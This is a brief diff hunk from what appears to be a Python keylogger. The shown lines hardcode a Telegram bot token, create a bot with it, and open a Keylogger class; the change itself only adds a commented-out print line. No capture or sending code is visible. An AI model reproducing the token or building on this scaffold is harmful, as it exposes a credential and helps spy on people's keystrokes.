@@ -20,6 +20,8 @@ TG_TOKEN = "884130464:AAFctNYgvIjwULpb28cmWV06NFlS4xra-pg"
 logging.basicConfig(level=logging.INFO)
 bot = telebot.TeleBot(TG_TOKEN)
 
+# print(f"Starting with @{bot.user.username}")
+
 
 class Keylogger:
     def __init__(self):
